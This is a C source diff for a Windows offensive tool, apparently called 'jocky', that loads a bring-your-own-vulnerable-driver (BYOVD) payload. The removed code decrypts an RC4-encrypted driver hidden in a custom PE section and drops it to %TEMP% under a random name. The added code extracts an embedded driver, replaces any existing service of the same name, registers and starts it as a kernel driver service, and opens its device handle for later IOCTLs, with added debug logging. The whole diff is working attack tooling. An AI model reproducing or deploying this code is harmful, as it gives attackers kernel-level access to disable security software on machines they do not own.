@@ -19,34 +19,11 @@
 #include <windows.h>
 #include <winsvc.h>
 #include <stdio.h>
+#include <stdarg.h>
 #include <string.h>
 #include <stdint.h>
 
-static const uint8_t JDRV_MAGIC[8] = {'J','O','C','K','Y','D','R','V'};
-
-/* ── Locate .jdrv in the running binary's in-memory image ───────────── */
-
-static uint8_t* find_jdrv_section(uint32_t* out_size)
-{
-    BYTE* base = (BYTE*)GetModuleHandleA(NULL);
-    if (!base) return NULL;
-
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
-
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
-
-    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        /* Section name ".jdrv" is 5 chars; remaining bytes are null. */
-        if (strncmp((char*)sec[i].Name, ".jdrv", 5) == 0) {
-            *out_size = sec[i].Misc.VirtualSize;
-            return base + sec[i].VirtualAddress;
-        }
-    }
-    return NULL;
-}
+extern bool jocky_extract_embedded_driver(const char* name, char* out_path, size_t path_len);
 
 /* ── Fast LCG-based random hex string (no CRT rand dependency) ───────── */
 
@@ -65,137 +42,115 @@ static void rand_hex8(char out[9])
 
 /* ── Public API ──────────────────────────────────────────────────────── */
 
+static void blog(const char* fmt, ...)
+{
+    va_list ap;
+    va_start(ap, fmt);
+    vprintf(fmt, ap);
+    va_end(ap);
+    fflush(stdout);
+}
+
 bool jocky_byovd_load(const char*    service_name,
                       const char*    device_name,
                       jocky_byovd_t* out)
 {
-    if (!out) return false;
-
-    /* Zero-initialise output so jocky_byovd_unload is always safe to call. */
+    blog("[BYOVD] Trying driver: %s\n", service_name ? service_name : "(null)");
+    if (!out) { blog("[BYOVD] ctx is NULL\n"); return false; }
     memset(out, 0, sizeof(*out));
     out->device = INVALID_HANDLE_VALUE;
 
-    /* 1. Find and validate the .jdrv section. */
-    uint32_t sec_size = 0;
-    uint8_t* sec_data = find_jdrv_section(&sec_size);
-    if (!sec_data || sec_size < 29u)          return false;
-    if (memcmp(sec_data, JDRV_MAGIC, 8) != 0) return false;
-
-    uint32_t       orig_size = *(uint32_t*)(sec_data + 8);
-    const uint8_t* rc4_key   = sec_data + 12;
-    const uint8_t* encrypted = sec_data + 28;
-
-    if (28u + orig_size > sec_size) return false;
-
-    /* 2. Decrypt driver bytes into a dedicated RW allocation. */
-    uint8_t* drv_buf = (uint8_t*)VirtualAlloc(NULL, orig_size,
-                                               MEM_COMMIT | MEM_RESERVE,
-                                               PAGE_READWRITE);
-    if (!drv_buf) return false;
-    memcpy(drv_buf, encrypted, orig_size);
-    jocky_decrypt_rc4(drv_buf, orig_size, rc4_key, 16);
-
-    /* 3. Drop to %TEMP%\<rand8>.sys */
-    char tmp_dir[MAX_PATH];
-    if (!GetTempPathA(MAX_PATH, tmp_dir)) {
-        VirtualFree(drv_buf, 0, MEM_RELEASE);
+    /* Extract embedded driver bytes to a temp file. */
+    char tmp_path[MAX_PATH];
+    if (!jocky_extract_embedded_driver(service_name, tmp_path, MAX_PATH)) {
+        blog("[BYOVD] extract failed for %s\n", service_name);
         return false;
     }
+    blog("[BYOVD] Extracted to: %s\n", tmp_path);
 
-    char hex8[9];
-    rand_hex8(hex8);
-    _snprintf(out->driver_path, MAX_PATH, "%s%s.sys", tmp_dir, hex8);
+    strncpy(out->driver_path, tmp_path, MAX_PATH - 1);
 
-    HANDLE hf = CreateFileA(out->driver_path, GENERIC_WRITE, 0, NULL,
-                            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hf == INVALID_HANDLE_VALUE) {
-        VirtualFree(drv_buf, 0, MEM_RELEASE);
-        out->driver_path[0] = '\0';
-        return false;
-    }
-    DWORD written = 0;
-    BOOL  wr_ok   = WriteFile(hf, drv_buf, orig_size, &written, NULL);
-    CloseHandle(hf);
-    VirtualFree(drv_buf, 0, MEM_RELEASE);
+    wchar_t wide_path[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, tmp_path, -1, wide_path, MAX_PATH);
 
-    if (!wr_ok || written != orig_size) {
-        DeleteFileA(out->driver_path);
-        out->driver_path[0] = '\0';
-        return false;
-    }
-
-    /* 4. Determine service name. */
     if (service_name && service_name[0]) {
         strncpy(out->service_name, service_name, 63);
+        char* dot = strrchr(out->service_name, '.');
+        if (dot) *dot = '\0';
     } else {
-        char hex2[9];
-        rand_hex8(hex2);
-        _snprintf(out->service_name, sizeof(out->service_name), "jky_%s", hex2);
+        strncpy(out->service_name, "jky_drv", 63);
     }
 
-    /* 5. Register as a kernel driver service in SCM. */
-    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    wchar_t wide_svc[64];
+    MultiByteToWideChar(CP_ACP, 0, out->service_name, -1, wide_svc, 64);
+
+    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!hSCM) {
-        DeleteFileA(out->driver_path);
-        out->driver_path[0] = '\0';
-        out->service_name[0] = '\0';
+        blog("[BYOVD] OpenSCManager failed: %lu\n", GetLastError());
+        DeleteFileA(tmp_path);
         return false;
     }
 
-    SC_HANDLE hSvc = CreateServiceA(
-        hSCM,
-        out->service_name,        /* service name */
-        out->service_name,        /* display name */
+    SC_HANDLE hExist = OpenServiceW(hSCM, wide_svc, SERVICE_STOP | DELETE);
+    if (hExist) {
+        SERVICE_STATUS ss;
+        ControlService(hExist, SERVICE_CONTROL_STOP, &ss);
+        Sleep(300);
+        DeleteService(hExist);
+        CloseServiceHandle(hExist);
+    }
+
+    SC_HANDLE hSvc = CreateServiceW(
+        hSCM, wide_svc, wide_svc,
         SERVICE_START | SERVICE_STOP | DELETE,
         SERVICE_KERNEL_DRIVER,
         SERVICE_DEMAND_START,
         SERVICE_ERROR_IGNORE,
-        out->driver_path,         /* full path to .sys */
+        wide_path,
         NULL, NULL, NULL, NULL, NULL);
 
-    if (!hSvc && GetLastError() == ERROR_SERVICE_EXISTS) {
-        hSvc = OpenServiceA(hSCM, out->service_name,
-                            SERVICE_START | SERVICE_STOP | DELETE);
-    }
-
     if (!hSvc) {
+        blog("[BYOVD] CreateService failed: %lu\n", GetLastError());
         CloseServiceHandle(hSCM);
-        DeleteFileA(out->driver_path);
-        out->driver_path[0]  = '\0';
-        out->service_name[0] = '\0';
+        DeleteFileA(tmp_path);
         return false;
     }
 
-    /* 6. Start the service (ignore ERROR_SERVICE_ALREADY_RUNNING). */
-    if (!StartServiceA(hSvc, 0, NULL)) {
+    if (!StartServiceW(hSvc, 0, NULL)) {
         DWORD err = GetLastError();
+        blog("[BYOVD] StartService failed: %lu\n", err);
         if (err != ERROR_SERVICE_ALREADY_RUNNING) {
             DeleteService(hSvc);
             CloseServiceHandle(hSvc);
             CloseServiceHandle(hSCM);
-            DeleteFileA(out->driver_path);
-            out->driver_path[0]  = '\0';
-            out->service_name[0] = '\0';
+            DeleteFileA(tmp_path);
             return false;
         }
+    } else {
+        blog("[BYOVD] Service started OK\n");
     }
 
     CloseServiceHandle(hSvc);
     CloseServiceHandle(hSCM);
 
-    /* 7. Open the device handle (best-effort; driver may not expose a symlink). */
+    /* device_name from the chain already includes \\.\  prefix — use as-is.
+     * Only prepend \\.\  if the name doesn't start with a backslash. */
     char dev_path[MAX_PATH];
-    const char* dname = (device_name && device_name[0]) ? device_name
-                                                         : out->service_name;
-    _snprintf(dev_path, MAX_PATH, "\\\\.\\%s", dname);
+    const char* dname = (device_name && device_name[0]) ? device_name : out->service_name;
+    if (dname[0] == '\\')
+        strncpy(dev_path, dname, MAX_PATH - 1);
+    else
+        _snprintf(dev_path, MAX_PATH, "\\\\.\\%s", dname);
 
-    out->device = CreateFileA(dev_path,
-                              GENERIC_READ | GENERIC_WRITE,
-                              0, NULL, OPEN_EXISTING,
-                              FILE_ATTRIBUTE_NORMAL, NULL);
-    /* out->device may be INVALID_HANDLE_VALUE if the driver has no symlink;
-     * that is not fatal – the caller can still send IOCTLs after resolving
-     * the device path another way. */
+    blog("[BYOVD] Opening device: %s\n", dev_path);
+    out->device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE,
+                              0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (out->device == INVALID_HANDLE_VALUE) {
+        blog("[BYOVD] Device open FAILED (err=%lu) — unloading\n", GetLastError());
+        jocky_byovd_unload(out);
+        return false;
+    }
+    blog("[BYOVD] Device handle OK\n");
     return true;
 }
 
